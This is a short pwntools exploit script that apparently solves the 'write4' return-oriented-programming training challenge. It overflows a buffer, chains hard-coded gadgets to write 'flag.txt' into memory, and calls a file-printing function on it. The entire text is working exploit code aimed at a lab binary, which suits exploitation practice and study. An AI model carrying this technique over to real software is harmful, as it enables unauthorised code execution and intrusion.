from pwn import *

POP_RDI = 0x400693
POP_R14_POP_R15 = 0x400690
MOV_PTR_R14_R15 = 0x400628
DATA = 0x601028
PRINT_FILE = 0x400510
FLAG_FILE = "flag.txt"

p = process("./write4")
payload = b'A' * 40
payload += p64(POP_R14_POP_R15)
payload += p64(DATA)
payload += b'flag.txt'
payload += p64(MOV_PTR_R14_R15)
payload += p64(POP_RDI)
payload += p64(DATA)
payload += p64(PRINT_FILE)

p.sendline(payload)
p.interactive()
